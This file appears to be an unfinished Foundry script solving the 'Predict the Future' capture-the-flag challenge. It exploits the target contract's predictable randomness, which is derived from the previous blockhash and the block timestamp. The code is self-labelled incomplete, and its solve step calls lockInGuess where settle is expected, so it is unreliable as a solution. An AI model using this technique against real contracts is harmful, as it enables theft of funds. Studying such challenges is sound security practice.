// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

// not finished yet
interface IPredictTheFuture {
    function isComplete() external view returns (bool);

    function lockInGuess(uint8 n) external payable;

    function settle() external;
}

contract PredictTheFutureSolution is Script {
    IPredictTheFuture private predictTheFuture =
        IPredictTheFuture(vm.envAddress("ADDRESS"));

    function setUp() public {}

    function run() public {
        vm.broadcast();
        PredictTheFutureSolver solver = new PredictTheFutureSolver{
            value: 1 ether
        }(address(predictTheFuture));

        vm.broadcast();
        solver.solve();
    }
}

contract PredictTheFutureSolver {
    uint8 answer = 7;
    address payable public owner;
    IPredictTheFuture private predictTheFuture;

    receive() external payable {}

    constructor(address _address) public payable {
        require(msg.value == 1 ether);
        owner = payable(msg.sender);
        predictTheFuture = IPredictTheFuture(_address);
        predictTheFuture.lockInGuess{value: 1 ether}(answer);
    }

    function now_answer() public view returns (uint8) {
        return
            uint8(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            blockhash(block.number - 1),
                            block.timestamp
                        )
                    )
                )
            ) % 10;
    }

    function solve() public payable {
        if (now_answer() == answer) {
            predictTheFuture.lockInGuess{value: 1 ether}(answer);
            owner.transfer(address(this).balance);
        }
    }
}
